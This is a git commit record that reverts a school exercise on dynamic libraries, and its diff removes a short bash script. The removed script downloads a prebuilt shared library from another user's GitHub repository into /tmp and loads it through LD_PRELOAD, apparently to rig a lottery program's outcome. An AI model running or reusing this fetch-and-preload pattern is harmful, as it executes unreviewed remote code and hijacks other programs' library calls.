c835417140b1f84746d4a694d75666e5ec88fea2
CharbelAssogba <69874512+charbossly@users.noreply.github.com>
2023-03-21 01:01:04 +0100

    Revert "Add 0x18-dynamic_libraries"

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++
@@ -1,3 +0,0 @@
-#!/bin/bash
-wget -qO /tmp/jackpot.so https://github.com/jzamora5/holbertonschool-low_level_programming/raw/master/0x18-dynamic_libraries/jackpot.so
-export LD_PRELOAD=/tmp/jackpot.so
